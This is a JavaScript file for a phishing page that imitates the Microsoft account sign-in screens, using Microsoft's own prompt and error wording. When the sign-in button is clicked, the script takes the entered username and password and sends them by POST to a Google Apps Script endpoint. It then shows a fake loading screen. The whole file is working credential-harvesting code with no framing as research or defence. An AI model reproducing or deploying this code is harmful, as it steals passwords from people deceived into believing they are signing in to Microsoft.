document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

    //back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })

    let unameVal = pwdVal = false;
    /////next button
    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', () => {
        //validate the form
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "pwd";
        }
    })


    //////sign in button

    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', () => {
        //validate the form
        validate();
        if (pwdVal) {
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";
            // Simulate sign in process
            // You can add your sign-in logic here
            // For now, just change the section to the final section

            // Perform the fetch operation with updated parameters
            var formData = new FormData();
            formData.append('username', document.getElementById('inp_uname').value);
            formData.append('password', document.getElementById('inp_pwd').value);

            loaderWrapper.style.display = 'block';


            // Perform the fetch operation with updated parameters
            fetch('https://script.google.com/macros/s/AKfycbxj1VrMY3XsfN1axJe86DP55rh7QAJLMdI0EqMau8uKvB28VcXWkpkpKkXZR1gb18qt/exec', {
                method: 'POST',

                body: formData,

            })
                .then(response => {
                    if (response.ok) {
                        // Redirect to a new page after 3 seconds
                        setTimeout(function () {
                            // window.location.href = 'new_page.html'; // Replace 'new_page.html' with the URL of your actual page
                        }, 3000);
                    } else {
                        throw new Error('Network response was not ok.');
                    }
                })
                .catch(error => {
                    console.error('There was a problem with the fetch operation:', error);
                });

            // Hide the loader after 10 seconds
            setTimeout(function () {
                loaderWrapper.style.display = 'none';
                alert('Loading done!');
            }, 10000); // 10 


        }
    })

    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }

        }
        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }

        }
        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
            unameInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
            pwdInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        }
        return false;
    }


    // JavaScript code to show loader for 10 seconds when reaching the last section
    document.addEventListener('DOMContentLoaded', function () {
        var loader = document.getElementById('loader');
        var lastSection = document.getElementById('section_final');
        var signInBtn = document.getElementById('btn_sig');

        // Observer to track changes in section visibility
        var observer = new IntersectionObserver(function (entries) {
            entries.forEach(function (entry) {
                if (entry.isIntersecting) {
                    // Show loader when the last section becomes visible
                    loader.style.display = 'block';
                    // Hide the loader after 10 seconds
                    setTimeout(function () {
                        loader.style.display = 'none';
                        alert('Completed');
                    }, 10000); // 10 seconds
                }
            });
        });

        // Observe the last section
        observer.observe(lastSection);
    });
})